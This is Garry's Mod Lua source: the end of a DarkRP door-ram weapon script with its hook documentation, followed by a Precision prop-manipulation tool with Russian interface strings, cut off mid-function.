function SWEP:PrimaryAttack()
    if not self:GetIronsights() then return end

    self:SetNextPrimaryFire(CurTime() + 2.5)

    self:GetOwner():LagCompensation(true)
    local trace = self:GetOwner():GetEyeTrace()
    self:GetOwner():LagCompensation(false)

    local hasRammed = getRamFunction(self:GetOwner(), trace)()

    if SERVER then
        hook.Call("onDoorRamUsed", GAMEMODE, hasRammed, self:GetOwner(), trace)
    end

    if not hasRammed then return end

    self:SetTotalUsedMagCount(self:GetTotalUsedMagCount() + 1)

    self:GetOwner():SetAnimation(PLAYER_ATTACK1)
    self:GetOwner():EmitSound(self.Sound)
    self:GetOwner():ViewPunch(Angle(-10, math.Round(util.SharedRandom("DarkRP_DoorRam" .. self:EntIndex() .. "_" .. self:GetTotalUsedMagCount(), -5, 5)), 0))
end

function SWEP:SecondaryAttack()
    if CLIENT then self.LastIron = CurTime() end
    self:SetNextSecondaryFire(CurTime() + 0.30)
    self:SetIronsights(not self:GetIronsights())
    if self:GetIronsights() then
        self:SetHoldType("rpg")
    else
        self:SetHoldType("normal")
    end
end

function SWEP:GetViewModelPosition(pos, ang)
    local Mul = 1

    if self.LastIron > CurTime() - 0.25 then
        Mul = math.Clamp((CurTime() - self.LastIron) / 0.25, 0, 1)
    end

    if self:GetIronsights() then
        Mul = 1-Mul
    end

    ang:RotateAroundAxis(ang:Right(), - 15 * Mul)
    return pos,ang
end

DarkRP.hookStub{
    name = "canDoorRam",
    description = "Called when a player attempts to ram something. Use this to override ram behaviour or to disallow ramming.",
    parameters = {
        {
            name = "ply",
            description = "The player using the door ram.",
            type = "Player"
        },
        {
            name = "trace",
            description = "The trace containing information about the hit position and ram entity.",
            type = "table"
        },
        {
            name = "ent",
            description = "Short for the entity that is about to be hit by the door ram.",
            type = "Entity"
        }
    },
    returns = {
        {
            name = "override",
            description = "Return true to override behaviour, false to disallow ramming and nil (or no value) to defer the decision.",
            type = "boolean"
        }
    },
    realm = "Shared"
}

if SERVER then
    DarkRP.hookStub{
        name = "onDoorRamUsed",
        description = "Called when the door ram has been used.",
        parameters = {
            {
                name = "success",
                description = "Whether the door ram has been successful in ramming.",
                type = "boolean"
            },
            {
                name = "ply",
                description = "The player that used the door ram.",
                type = "Player"
            },
            {
                name = "trace",
                description = "The trace containing information about the hit position and ram entity.",
                type = "table"
            }
        },
        returns = {

        }
    }
end
--PATH gamemodes/sandbox/entities/weapons/gmod_tool/stools/precision.lua:

-----------------------------------------------------
timer.Simple(.1, function()
	if CLIENT then
		language.Add('tool.precision.name', 'Проталкивание пропов')
		language.Add('tool.precision.desc', 'Проталкивает проп в определенном направлении')
		language.Add('tool.precision.0', 'ПКМ - Вперед, R - Назад')
	end
end)

TOOL.Category		= "Основное"
TOOL.Name			= "Проталкивание пропов"
TOOL.Command		= nil
TOOL.ConfigName		= ""


TOOL.ClientConVar[ "user" ] 			= "1"

TOOL.ClientConVar[ "freeze" ]	 		= "1"
TOOL.ClientConVar[ "nocollide" ]		= "0"
TOOL.ClientConVar[ "nocollideall" ]		= "0"
TOOL.ClientConVar[ "rotation" ] 		= "15"
TOOL.ClientConVar[ "rotate" ] 			= "1"
TOOL.ClientConVar[ "offset" ]	 		= "0"
TOOL.ClientConVar[ "forcelimit" ]		= "0"
TOOL.ClientConVar[ "torquelimit" ] 		= "0"
TOOL.ClientConVar[ "friction" ]	 		= "0"
TOOL.ClientConVar[ "width" ]	 		= "1"
TOOL.ClientConVar[ "offsetpercent" ] 	= "1"
TOOL.ClientConVar[ "removal" ]	 		= "0"
TOOL.ClientConVar[ "move" ]	 			= "1"
TOOL.ClientConVar[ "physdisable" ]		= "0"
TOOL.ClientConVar[ "ShadowDisable" ]	= "0"
TOOL.ClientConVar[ "allowphysgun" ]		= "0"
TOOL.ClientConVar[ "autorotate" ]		= "0"
TOOL.ClientConVar[ "entirecontrap" ]	= "0"
TOOL.ClientConVar[ "nudge" ]			= "25"
TOOL.ClientConVar[ "nudgepercent" ]		= "1"
TOOL.ClientConVar[ "disablesliderfix" ]	= "0"

//adv ballsocket
TOOL.ClientConVar[ "XRotMin" ]		= "-180"
TOOL.ClientConVar[ "XRotMax" ]		= "180"
TOOL.ClientConVar[ "YRotMin" ]		= "-180"
TOOL.ClientConVar[ "YRotMax" ]		= "180"
TOOL.ClientConVar[ "ZRotMin" ]		= "-180"
TOOL.ClientConVar[ "ZRotMax" ]		= "180"
TOOL.ClientConVar[ "XRotFric" ]		= "0"
TOOL.ClientConVar[ "YRotFric" ]		= "0"
TOOL.ClientConVar[ "ZRotFric" ]		= "0"
TOOL.ClientConVar[ "FreeMov" ]		= "0"

//Removal
TOOL.ClientConVar[ "removal_nocollide" ]	= "1"
TOOL.ClientConVar[ "removal_weld" ]	 		= "1"
TOOL.ClientConVar[ "removal_axis" ]	 		= "1"
TOOL.ClientConVar[ "removal_ballsocket" ]	= "1"
TOOL.ClientConVar[ "removal_advballsocket" ]= "1"
TOOL.ClientConVar[ "removal_slider" ]	 	= "1"
TOOL.ClientConVar[ "removal_parent" ]	 	= "1"
TOOL.ClientConVar[ "removal_other" ]	 	= "1"


TOOL.ClientConVar[ "enablefeedback" ]	= "1"
TOOL.ClientConVar[ "chatfeedback" ]		= "1"
TOOL.ClientConVar[ "nudgeundo" ]		= "0"
TOOL.ClientConVar[ "moveundo" ]			= "1"
TOOL.ClientConVar[ "rotateundo" ]		= "1"

function TOOL:DoParent( Ent1, Ent2 )
	local TempEnt = Ent2
	if !(Ent1 && Ent1:IsValid() && Ent1:EntIndex() != 0) then
		--self:SendMessage( "Oops, First Target was world or something invalid" )
		return
	end
	if !(Ent2 && Ent2:IsValid() && Ent2:EntIndex() != 0) then
		--self:SendMessage( "Oops, Second Target was world or something invalid" )
		return
	end
	if ( Ent1 == Ent2 ) then
		--self:SendMessage( "Oops, Can't parent something to itself" )
		return
	end
	Ent1:SetMoveType(MOVETYPE_NONE)
	local disablephysgun = self:GetClientNumber( "allowphysgun" ) == 0
	Ent1.PhysgunDisabled = disablephysgun
	Ent1:SetUnFreezable( disablephysgun )
	local Phys1 = Ent1:GetPhysicsObject()
	if Phys1:IsValid() then
		Phys1:EnableCollisions( false )
	end
	while true do
		if ( !TempEnt:GetParent():IsValid() ) then
			Ent1:SetParent( Ent2 )
			if self:GetClientNumber( "entirecontrap" ) == 0 then self:SendMessage( "Parent Set." ) end
			Phys1:Wake()
			break
		elseif ( TempEnt:GetParent() == Ent1 ) then
			UndoParent( TempEnt )
			timer.Simple( 0.1, function()//delay to stop crash
				Ent1.SetParent( Ent1, Ent2)
			end)
			--self:SendMessage( "Oops, Closed Parent Loop Detected; Broken loop and set parent." )
			break
		else
			TempEnt = TempEnt:GetParent()
		end
	end
	Phys1:Wake()
	//Phys1:UpdateShadow(Ent1:GetAngles(),Ent1:GetAngles())
end

function TOOL:UndoParent( Ent1 )
	Ent1:SetParent( nil )
	Ent1:SetMoveType(MOVETYPE_VPHYSICS)
	Ent1.PhysgunDisabled = false
	Ent1:SetUnFreezable( false )
	local Phys1 = Ent1:GetPhysicsObject()
	if Phys1:IsValid() then
		Phys1:EnableCollisions( true )
		Phys1:Wake()
		//Phys1:UpdateShadow(Ent1:GetAngles(),Ent1:GetAngles())
	end
end

function TOOL:DoApply(CurrentEnt, FirstEnt, autorotate, nocollideall, ShadowDisable )
	local CurrentPhys = CurrentEnt:GetPhysicsObject()
	
	//local col = CurrentEnt:GetCollisionGroup()
	//col = 19
	//CurrentEnt:SetCollisionGroup(col)
	//self:SendMessage("New group: "..col)
	
	//if ( CurrentPhys:IsDragEnabled() ) then
	//end
	//CurrentPhys:SetAngleDragCoefficient(1.05)
	//CurrentPhys:SetDragCoefficient(1.05)
	
	if ( autorotate ) then
		if ( CurrentEnt == FirstEnt ) then//Snap-rotate original object first.  Rest needs to rotate around it.
			local angle = CurrentPhys:RotateAroundAxis( Vector( 0, 0, 1 ), 0 )
			self.anglechange = Vector( angle.p - (math.Round(angle.p/45))*45, angle.r - (math.Round(angle.r/45))*45, angle.y - (math.Round(angle.y/45))*45 )
			if ( table.Count(self.TaggedEnts) == 1 ) then
				angle.p = (math.Round(angle.p/45))*45
				angle.r = (math.Round(angle.r/45))*45//Only rotate on these axies if it's singular.
			end
			angle.y = (math.Round(angle.y/45))*45
			CurrentPhys:SetAngles( angle )
		else
			local distance = math.sqrt(math.pow((CurrentEnt:GetPos().X-FirstEnt:GetPos().X),2)+math.pow((CurrentEnt:GetPos().Y-FirstEnt:GetPos().Y),2))
			local theta = math.atan((CurrentEnt:GetPos().Y-FirstEnt:GetPos().Y) / (CurrentEnt:GetPos().X-FirstEnt:GetPos().X)) - math.rad(self.anglechange.Z)
			if (CurrentEnt:GetPos().X-FirstEnt:GetPos().X) < 0 then
				CurrentEnt:SetPos( Vector( FirstEnt:GetPos().X - (distance*(math.cos(theta))), FirstEnt:GetPos().Y - (distance*(math.sin(theta))), CurrentEnt:GetPos().Z ) )
			else
				CurrentEnt:SetPos( Vector( FirstEnt:GetPos().X + (distance*(math.cos(theta))), FirstEnt:GetPos().Y + (distance*(math.sin(theta))), CurrentEnt:GetPos().Z ) )
			end
			CurrentPhys:SetAngles( CurrentPhys:RotateAroundAxis( Vector( 0, 0, -1 ), self.anglechange.Z ) )
		end
	end

	CurrentPhys:EnableCollisions( !nocollideall )
	CurrentEnt:DrawShadow( !ShadowDisable )
	if physdis then
		CurrentEnt:SetMoveType(MOVETYPE_NONE)
		CurrentEnt.PhysgunDisabled = disablephysgun
		CurrentEnt:SetUnFreezable( disablephysgun )
	else
		CurrentEnt:SetMoveType(MOVETYPE_VPHYSICS)
		CurrentEnt.PhysgunDisabled = false
		CurrentEnt:SetUnFreezable( false )
	end
	CurrentPhys:Wake()
end

function TOOL:CreateUndo(constraint,undoname)
	if (constraint) then
		undo.Create(undoname)
		undo.AddEntity( constraint )
		undo.SetPlayer( self:GetOwner() )
		undo.Finish()
		self:GetOwner():AddCleanup( "constraints", constraint )
	end
end

function TOOL:UndoRepairToggle()
	for key,CurrentEnt in pairs(self.TaggedEnts) do
		if ( CurrentEnt and CurrentEnt:IsValid() ) then
			if !(CurrentEnt == Ent2 ) then
				local CurrentPhys = CurrentEnt:GetPhysicsObject()
				if ( CurrentPhys:IsValid() && !CurrentEnt:GetParent():IsValid() ) then//parent?
					if ( CurrentEnt:GetPhysicsObjectCount() < 2 ) then //not a ragdoll
						if ( CurrentEnt:GetCollisionGroup() == COLLISION_GROUP_WORLD ) then
							CurrentEnt:SetCollisionGroup( COLLISION_GROUP_NONE )
						elseif ( CurrentEnt:GetCollisionGroup() == COLLISION_GROUP_NONE ) then
							CurrentEnt:SetCollisionGroup( COLLISION_GROUP_WORLD )
						end
						if ( speeddamp == 0 && angledamp == 0 ) then
							CurrentPhys:SetDamping( 5, 5 )
						elseif ( speeddamp == 5 && angledamp == 5 ) then
							CurrentPhys:SetDamping( 0, 0 )
						end
						CurrentPhys:Wake()
					end
				end
			end
		end
	end
	self.RepairTodo = false
end

function TOOL:DoConstraint(mode)
	self:SetStage(0)
	// Get information we're about to use
	local Ent1,  Ent2  = self:GetEnt(1),    self:GetEnt(2)

	if ( !Ent1:IsValid() || CLIENT ) then
		self:ClearObjects()
		return false//Something happened to original target, don't continue
	end
	// Get client's CVars
	local forcelimit 	= self:GetClientNumber( "forcelimit", 0 )
	local freeze		= util.tobool( self:GetClientNumber( "freeze", 1 ) )
	local nocollide		= 0
	local nocollideall	= false
	local torquelimit	= self:GetClientNumber( "torquelimit", 0 )
	local width			= self:GetClientNumber( "width", 1 )
	local friction		= self:GetClientNumber( "friction", 0 )
	local physdis		= util.tobool( self:GetClientNumber( "physdisable", 0 ) )
	local ShadowDisable = util.tobool( self:GetClientNumber( "ShadowDisable", 0 ) )
	local autorotate 	= util.tobool(self:GetClientNumber( "autorotate",1 ))
	local removal_nocollide 	= util.tobool(self:GetClientNumber( "removal_nocollide",1 ))
	local removal_weld 	= util.tobool(self:GetClientNumber( "removal_weld",1 ))
	local removal_axis 	= util.tobool(self:GetClientNumber( "removal_axis",1 ))
	local removal_ballsocket 	= util.tobool(self:GetClientNumber( "removal_ballsocket",1 ))
	local removal_advballsocket 	= util.tobool(self:GetClientNumber( "removal_advballsocket",1 ))
	local removal_slider 	= util.tobool(self:GetClientNumber( "removal_slider",1 ))
	local removal_parent 	= util.tobool(self:GetClientNumber( "removal_parent",1 ))
	local removal_other 	= util.tobool(self:GetClientNumber( "removal_other",1 ))
	local Bone1 = self:GetBone(1)
	local LPos1 = self:GetLocalPos(1)
	local Bone2 = nil
	local LPos2 = nil
	if ( Ent2 && (Ent2:IsValid() || Ent2:IsWorld()) ) then
		Bone2 = self:GetBone(2)
		LPos2 = self:GetLocalPos(2)
	end
	local Phys1 = self:GetPhys(1)
	
	local NumApp = 0
	

	for key,CurrentEnt in pairs(self.TaggedEnts) do
		if ( CurrentEnt and CurrentEnt:IsValid() ) then
			if !(CurrentEnt == Ent2 ) then
				local CurrentPhys = CurrentEnt:GetPhysicsObject()
				if ( CurrentPhys:IsValid() && !CurrentEnt:GetParent():IsValid() ) then//parent?
					if ( CurrentEnt:GetPhysicsObjectCount() < 2 ) then //not a ragdoll
						if (  util.tobool( nocollide ) && (mode == 1 || mode == 3)) then // not weld/axis/ballsocket or single application
							local constraint = constraint.NoCollide(CurrentEnt, Ent2, 0, Bone2)
						end
						if ( mode == 1 ) then //Apply
							self:DoApply( CurrentEnt, Ent1, autorotate, nocollideall, ShadowDisable )
						elseif ( mode == 2 ) then //Rotate
							//self:SendMessage("Sorry, No entire contraption rotating... yet")
							//return false//TODO: Entire contrpation rotaton
						elseif ( mode == 3 ) then //move
							//self:SendMessage("Sorry, No entire contraption moving... yet")
							//return false//todo: entire contraption move/snap
						elseif ( mode == 4 ) then //weld
							local constr = constraint.Weld( CurrentEnt, Ent2, 0, Bone2, forcelimit,  util.tobool( nocollide ) )
							self:CreateUndo(constr,"Precision_Weld")
						elseif ( mode == 5 ) then //doaxis
							local constr = constraint.Axis( CurrentEnt, Ent2, Bone1, Bone2, LPos1, LPos2, forcelimit, torquelimit, friction, nocollide )
							self:CreateUndo(constr,"Precision_Axis")
						elseif ( mode == 6 ) then //ballsocket
							local constr = constraint.Ballsocket( CurrentEnt, Ent2, 0, Bone2, LPos2, forcelimit, torquelimit, nocollide )
							self:CreateUndo(constr,"Precision_Ballsocket")
						elseif ( mode == 7 ) then //adv ballsocket
							local constr = constraint.AdvBallsocket( CurrentEnt, Ent2, 0, Bone2, LPos1, LPos2, forcelimit, torquelimit, self:GetClientNumber( "XRotMin", -180 ), self:GetClientNumber( "YRotMin", -180 ), self:GetClientNumber( "ZRotMin", -180 ), self:GetClientNumber( "XRotMax", 180 ), self:GetClientNumber( "YRotMax", 180 ), self:GetClientNumber( "ZRotMax", 180 ), self:GetClientNumber( "XRotFric", 0 ), self:GetClientNumber( "YRotFric", 0 ), self:GetClientNumber( "ZRotFric", 0 ), self:GetClientNumber( "FreeMov", 0 ), nocollide )
							self:CreateUndo(constr,"Precision_Advanced_Ballsocket")
						elseif ( mode == 8 ) then //slider
							local constraint0 = constraint.Slider( CurrentEnt, Ent2, 0, Bone2, LPos1, LPos2, width )
							if (constraint0) then
								undo.Create("Precision_Slider")
								if ( self:GetClientNumber( "disablesliderfix" ) == 0 ) then
									local constraint2 = constraint.AdvBallsocket( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, 0, 0, 0, -180, -180, 0, 180, 180, 50, 0, 0, 1, 0 )
									if (constraint2) then
										undo.AddEntity( constraint2 )
									end
									local constraint3 = constraint.AdvBallsocket( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, 0, 0, -180, 0, -180, 180, 0, 180, 0, 50, 0, 1, 0 )
									if (constraint3) then
										undo.AddEntity( constraint3 )
									end
									local constraint4 = constraint.AdvBallsocket( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, 0, 0, -180, -180, 0, 180, 180, 0, 0, 0, 50, 1, 0 )
									if (constraint4) then
										undo.AddEntity( constraint4 )
									end
								end
								undo.AddEntity( constraint0 )
								undo.SetPlayer( self:GetOwner() )
								undo.Finish()
								self:GetOwner():AddCleanup( "constraints", constraint0 )
							end
						elseif ( mode == 9 ) then //Parent
							self:DoParent( CurrentEnt, Ent2 )
						elseif ( mode == 10 && !self.RepairTodo ) then//Repair spaz
							if ( CurrentEnt:GetCollisionGroup() == COLLISION_GROUP_WORLD ) then
								CurrentEnt:SetCollisionGroup( COLLISION_GROUP_NONE )
							elseif ( CurrentEnt:GetCollisionGroup() == COLLISION_GROUP_NONE ) then
								CurrentEnt:SetCollisionGroup( COLLISION_GROUP_WORLD )
							end
								//CurrentPhys:EnableGravity( !CurrentPhys:IsGravityEnabled() )//Can't disable gravity - sliders would go nuts and disappear.	
							local speeddamp,angledamp = CurrentPhys:GetDamping()
							if ( speeddamp == 0 && angledamp == 0 ) then
								CurrentPhys:SetDamping( 5, 5 )
							elseif ( speeddamp == 5 && angledamp == 5 ) then
								CurrentPhys:SetDamping( 0, 0 )
							end
							CurrentEnt:SetPos(CurrentEnt:GetPos())
							CurrentPhys:Wake()
						elseif ( mode == 11 ) then //Removal
							if ( CLIENT ) then return true end//? should probably be in more places
							if ( removal_nocollide ) then
								constraint.RemoveConstraints( CurrentEnt, "NoCollide" )
								CurrentPhys:EnableCollisions(true)
							end
							if ( removal_weld ) then
								constraint.RemoveConstraints( CurrentEnt, "Weld" )
							end
							if ( removal_axis ) then
								constraint.RemoveConstraints( CurrentEnt, "Axis" )
							end
							if ( removal_ballsocket ) then
								constraint.RemoveConstraints( CurrentEnt, "Ballsocket" )
							end
							if ( removal_advballsocket ) then
								constraint.RemoveConstraints( CurrentEnt, "AdvBallsocket" )
							end
							if ( removal_slider ) then
								constraint.RemoveConstraints( CurrentEnt, "Slider" )
							end
							if ( removal_parent) then
								if ( CurrentEnt:GetParent():IsValid() ) then
									self:UndoParent( CurrentEnt )
								end
							end
							if ( removal_other ) then
								constraint.RemoveConstraints( CurrentEnt, "Elastic" )
								constraint.RemoveConstraints( CurrentEnt, "Hydraulic" )
								constraint.RemoveConstraints( CurrentEnt, "Keepupright" )
								constraint.RemoveConstraints( CurrentEnt, "Motor" )
								constraint.RemoveConstraints( CurrentEnt, "Muscle" )
								constraint.RemoveConstraints( CurrentEnt, "Pulley" )
								constraint.RemoveConstraints( CurrentEnt, "Rope" )
								constraint.RemoveConstraints( CurrentEnt, "Winch" )
							end
						end
						if ( mode <= 8 ) then
							CurrentPhys:EnableMotion( !freeze )
							CurrentPhys:Wake()
						end
					end
				end
			end
		end
		NumApp = NumApp + 1
	end//Next
	if ( mode == 1 ) then
		--self:SendMessage( NumApp .. " items targeted for apply." )
	elseif ( mode == 2 ) then
		--self:SendMessage( NumApp .. " items targeted for rotate." )
	elseif ( mode == 3 ) then
		--self:SendMessage( NumApp .. " items targeted for move." )
	elseif ( mode == 4 ) then
		--self:SendMessage( NumApp .. " items targeted for weld." )
	elseif ( mode == 5 ) then
		--self:SendMessage( NumApp .. " items targeted for axis." )
	elseif ( mode == 6 ) then
		--self:SendMessage( NumApp .. " items targeted for ballsocket." )
	elseif ( mode == 7 ) then
		--self:SendMessage( NumApp .. " items targeted for adv. ballsocket." )
	elseif ( mode == 8 ) then
		--self:SendMessage( NumApp .. " items targeted for slider." )
	elseif ( mode == 9 ) then
		--self:SendMessage( NumApp .. " items targeted for parenting." )
	elseif ( mode == 10 ) then
		--self:SendMessage( NumApp .. " items targeted for repair." )
	elseif ( mode == 11 ) then
		--self:SendMessage( NumApp .. " items targeted for constraint removal." )
	end
	
	
	if ( mode == 10 ) then
		self.RepairTodo = true
		timer.Simple( 1.0, function()
		self:ClearSelection()
		end)
	else
		self:ClearSelection()
	end
	// Clear the objects so we're ready to go again
	self:ClearObjects()
end

function TOOL:SendMessage( message )
	if ( self:GetClientNumber( "enablefeedback" ) == 0 ) then return end
	if ( self:GetClientNumber( "chatfeedback" ) == 1 ) then
		self:GetOwner():PrintMessage( HUD_PRINTTALK, "" .. message )
	else
		self:GetOwner():PrintMessage( HUD_PRINTCENTER, message )
	end
end

function TOOL:TargetValidity ( trace, Phys ) //TODO: Parented stuff should return 1
	if ( SERVER && (!util.IsValidPhysicsObject( trace.Entity, trace.PhysicsBone ) || !Phys:IsValid()) ) then
		local mode = self:GetClientNumber( "mode" )
		if ( trace.Entity:GetParent():IsValid() ) then
			return 2//Valid parent, but itself isn't
		else
			return 0//No valid phys
		end
	elseif ( trace.Entity:IsPlayer() ) then
		return 0// Don't attach players, or to players
	elseif ( trace.HitWorld ) then
		return 1// Only allow second click to be here...
	else
		return 3//Everything seems good
	end
end

function TOOL:StartRotate()
	local Ent = self:GetEnt(1)
	local Phys = self:GetPhys(1)
	local oldposu = Ent:GetPos()
	local oldangles = Ent:GetAngles()

	local function MoveUndo( Undo, Entity, oldposu, oldangles )
		if Entity:IsValid() then
			Entity:SetAngles( oldangles )
			Entity:SetPos( oldposu )
		end
	end
	
	if ( self:GetClientNumber( "rotateundo" )) then
		if SERVER then
			undo.Create("Precision_Rotate")
				undo.SetPlayer(self:GetOwner())
				undo.AddFunction( MoveUndo, Ent, oldposu, oldangles )
			undo.Finish()
		end
	end
	
	if IsValid( Phys ) then
		Phys:EnableMotion( false ) //else it drifts
	end
	
	local rotation = self:GetClientNumber( "rotation" )
	if ( rotation < 0.02 ) then rotation = 0.02 end
	self.axis = self:GetNormal(1)
	self.axisY = self.axis:Cross(Ent:GetUp())
	if self:WithinABit( self.axisY, Vector(0,0,0) ) then
		self.axisY = self.axis:Cross(Ent:GetForward())
	end
	self.axisZ = self.axisY:Cross(self.axis)
	self.realdegrees = 0
	self.lastdegrees = -((rotation/2) % rotation)
	self.realdegreesY = 0
	self.lastdegreesY = -((rotation/2) % rotation)
	self.realdegreesZ = 0
	self.lastdegreesZ = -((rotation/2) % rotation)
	self.OldPos = self:GetPos(1)//trace.HitPos
end

function TOOL:DoMove()
	// Get information we're about to use
	local Norm1, Norm2 = self:GetNormal(1),   self:GetNormal(2)
	local Phys1, Phys2 = self:GetPhys(1),     self:GetPhys(2)
	
	local Ang1, Ang2 = Norm1:Angle(), (Norm2 * -1):Angle()
	if self:GetClientNumber( "autorotate" ) == 1 then
		Ang2.p = (math.Round(Ang2.p/45))*45
		Ang2.r = (math.Round(Ang2.r/45))*45
		Ang2.y = (math.Round(Ang2.y/45))*45
		Norm2 = Ang2:Forward() * -1
	end


	local oldposu = self:GetEnt(1):GetPos()
	local oldangles = self:GetEnt(1):GetAngles()

	local function MoveUndo( Undo, Entity, oldposu, oldangles )
		if Entity:IsValid() then
			Entity:SetAngles( oldangles )
			Entity:SetPos( oldposu )
		end
	end
	if self:GetClientNumber( "moveundo" ) == 1 then
	undo.Create("Precision Move")
		undo.SetPlayer(self:GetOwner())
		undo.AddFunction( MoveUndo, self:GetEnt(1), oldposu, oldangles )
	undo.Finish()
	end

	local rotation = self:GetClientNumber( "rotation" )
	if ( rotation < 0.02 ) then rotation = 0.02 end
	if ( (self:GetClientNumber( "rotate" ) == 1 && mode != 1) || mode == 2) then//Set axies for rotation mode directions
		self.axis = Norm2
		self.axisY = self.axis:Cross(Vector(0,1,0))
		if self:WithinABit( self.axisY, Vector(0,0,0) ) then
			self.axisY = self.axis:Cross(Vector(0,0,1))
		end
		self.axisY:Normalize()
		self.axisZ = self.axisY:Cross(self.axis)
		self.axisZ:Normalize()
		self.realdegrees = 0
		self.lastdegrees = -((rotation/2) % rotation)
		self.realdegreesY = 0
		self.lastdegreesY = -((rotation/2) % rotation)
		self.realdegreesZ = 0
		self.lastdegreesZ = -((rotation/2) % rotation)
	else
		self.axis = Norm2
		self.axisY = self.axis:Cross(Vector(0,1,0))
		if self:WithinABit( self.axisY, Vector(0,0,0) ) then
			self.axisY = self.axis:Cross(Vector(0,0,1))
		end
		self.axisY:Normalize()
		self.axisZ = self.axisY:Cross(self.axis)
		self.axisZ:Normalize()
	end



	local TargetAngle = Phys1:AlignAngles( Ang1, Ang2 )//Get angle Phys1 would be at if difference between Ang1 and Ang2 was added


	if self:GetClientNumber( "autorotate" ) == 1 then
		TargetAngle.p = (math.Round(TargetAngle.p/45))*45
		TargetAngle.r = (math.Round(TargetAngle.r/45))*45
		TargetAngle.y = (math.Round(TargetAngle.y/45))*45
	end

	Phys1:SetAngles( TargetAngle )


	local NewOffset = math.Clamp( self:GetClientNumber( "offset" ), -5000, 5000 )
	local offsetpercent		= self:GetClientNumber( "offsetpercent" ) == 1
	if ( offsetpercent ) then
		local  Ent2  = self:GetEnt(2)
		local glower = Ent2:OBBMins()
		local gupper = Ent2:OBBMaxs()
		local height = math.abs(gupper.z - glower.z) -0.5
		if self:WithinABit(Norm2,Ent2:GetForward()) then
			height = math.abs(gupper.x - glower.x)-0.5
		elseif self:WithinABit(Norm2,Ent2:GetRight()) then
			height = math.abs(gupper.y - glower.y)-0.5
		end
		NewOffset = NewOffset / 100
		NewOffset = NewOffset * height
	end
	Norm2 = Norm2 * (-0.0625 + NewOffset)
	local TargetPos = self:GetPos(2) + (Phys1:GetPos() - self:GetPos(1)) + (Norm2)
	//self:SetPos(2)

	// Set the position

	Phys1:SetPos( TargetPos )
	Phys1:EnableMotion( false )

	// Wake up the physics object so that the entity updates
	Phys1:Wake()
end

function TOOL:ToggleColor( CurrentEnt )
	color = CurrentEnt:GetColor()
	color["a"] = color["a"] - 128
	if ( color["a"] < 0 ) then
		color["a"] = color["a"] + 256
	end
	color["r"] = color["r"] - 128
	if ( color["r"] < 0 ) then
		color["r"] = color["r"] + 256
	end
	color["g"] = color["g"] - 128
	if ( color["g"] < 0 ) then
		color["g"] = color["g"] + 256
	end
	color["b"] = color["b"] - 128
	if ( color["b"] < 0 ) then
		color["b"] = color["b"] + 256
	end
	CurrentEnt:SetColor( color )
	if ( color["a"] == 255 ) then
		CurrentEnt:SetRenderMode( 0 )
	else
		CurrentEnt:SetRenderMode( 1 )
	end
end

function TOOL:ClearSelection()
	if ( self.RepairTodo ) then
		self:UndoRepairToggle()
	end
	if ( self.TaggedEnts ) then
		local color
		for key,CurrentEnt in pairs(self.TaggedEnts) do
			if ( CurrentEnt and CurrentEnt:IsValid() ) then
				local CurrentPhys = CurrentEnt:GetPhysicsObject()
				if ( CurrentPhys:IsValid() ) then
					self:ToggleColor(CurrentEnt)
				end
			end
		end
	end
	self.TaggedEnts = {}
end

function TOOL:SelectEnts(StartEnt, AllConnected)
	self:ClearSelection()
	if ( CLIENT ) then return end
	local color
	if ( AllConnected == 1 ) then
		local NumApp = 0
		EntsTab = {}
		ConstsTab = {}
		GetAllEnts(StartEnt, self.TaggedEnts, EntsTab, ConstsTab)
		for key,CurrentEnt in pairs(self.TaggedEnts) do
			if ( CurrentEnt and CurrentEnt:IsValid() ) then
				local CurrentPhys = CurrentEnt:GetPhysicsObject()
				if ( CurrentPhys:IsValid() ) then
					self:ToggleColor(CurrentEnt)
				end
			end
			NumApp = NumApp + 1
		end
		self:SendMessage( NumApp .. " objects selected." )
	else
		if ( StartEnt and StartEnt:IsValid() ) then
			local CurrentPhys = StartEnt:GetPhysicsObject()
			if ( CurrentPhys:IsValid() ) then
				table.insert(self.TaggedEnts, StartEnt)
				self:ToggleColor(StartEnt)
			end
		end
	end
	
end

function TOOL:LeftClick( trace )
	-- local stage = self:GetStage()//0 = started, 1 = moving/second target, 2 = rotation?
	-- local mode = self:GetClientNumber( "mode" )
	-- local moving = ( mode == 3 || (self:GetClientNumber( "move" ) == 1 && mode >= 3 && mode <= 8 ) )
	-- local rotating = ( self:GetClientNumber( "rotate" ) == 1 )
	-- local Phys = trace.Entity:GetPhysicsObjectNum( trace.PhysicsBone )

	
	-- if ( stage == 0 ) then//first click - choose a target.
		-- if ( self:TargetValidity(trace, Phys) <= 1 ) then
			-- return false//No phys or hit world
		-- end
		-- self:SetObject( 1, trace.Entity, trace.HitPos, Phys, trace.PhysicsBone, trace.HitNormal )
		
		-- if (self:GetClientNumber( "entirecontrap" ) == 1 || mode == 10 ) then
			-- self:SelectEnts(trace.Entity,1)
		-- else
			-- self:SelectEnts(trace.Entity,0)
		-- end
		-- if ( mode == 1 || mode == 10 || mode == 11 ) then //Don't care about stage, always apply.
			-- self:DoConstraint(mode)
		-- else
			-- if ( mode == 9 ) then
				-- self:SetStage(1)
			-- else
				-- if ( moving ) then//Moving
					-- self:StartGhostEntity( trace.Entity )
					-- self:SetStage(1)
				-- elseif ( mode == 2 ) then//Straight to rotate
					-- self:StartRotate()
					-- self:SetStage(2)
				-- else
					-- self:SetStage(1)
				-- end
			-- end
		-- end
	-- elseif ( stage == 1 ) then//Second click
		-- self:SetObject( 2, trace.Entity, trace.HitPos, Phys, trace.PhysicsBone, trace.HitNormal )
		
		-- if ( self:GetEnt(1) == self:GetEnt(2) ) then
			-- SavedPos = self:GetPos(2)
		-- end
		-- if ( mode == 9 ) then
			-- self:DoConstraint(mode)
		-- else
			-- if ( moving ) then
				-- if ( CLIENT ) then
					-- self:ReleaseGhostEntity()
					-- return true
				-- end
				-- if ( SERVER && !game.SinglePlayer() ) then
					-- self:ReleaseGhostEntity()
					-- //return true
				-- end
				-- self:DoMove()
			-- end
			-- if ( rotating ) then
				-- self:StartRotate()
				-- self:SetStage(2)
			-- else
				-- self:DoConstraint(mode)
			-- end
		-- end
	-- elseif ( stage == 2 ) then//Done rotate
		-- self:DoConstraint(mode)
	-- end
	-- return true
end

function TOOL:WithinABit( v1, v2 )
	local tol = 0.1
	local da = v1.x-v2.x
	local db = v1.y-v2.y
	local dc = v1.z-v2.z
	if da < tol && da > -tol && db < tol && db > -tol && dc < tol && dc > -tol then
		return true
	else
		da = v1.x+v2.x
		db = v1.y+v2.y
		dc = v1.z+v2.z
